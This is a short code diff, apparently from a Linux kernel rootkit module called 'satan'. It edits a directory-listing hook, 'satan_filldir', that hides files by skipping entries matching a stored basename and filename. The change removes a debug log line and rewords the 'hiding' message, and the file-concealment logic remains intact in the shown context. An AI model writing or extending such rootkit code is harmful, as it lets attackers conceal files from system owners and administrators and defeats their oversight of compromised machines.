@@ -338,11 +338,8 @@ static int satan_filldir(struct dir_context *ctx, const char *name, int namlen,
                 // At this point:
                 // 1. Current basename is stored in `basename`.
                 // 2. Current filename is stored in `name`.
-                pr_info("satan: comparing: (%s,%s) and (%s,%s)\n",
-                        f->basename, basename, f->filename, name);
-
                 if (!strcmp(f->basename, basename) && !strcmp(f->filename, name)) {
-                        pr_info("satan: hiding: %s", name);
+                        pr_info("satan: file: hiding: %s", name);
                         return 0;
                 }
         }
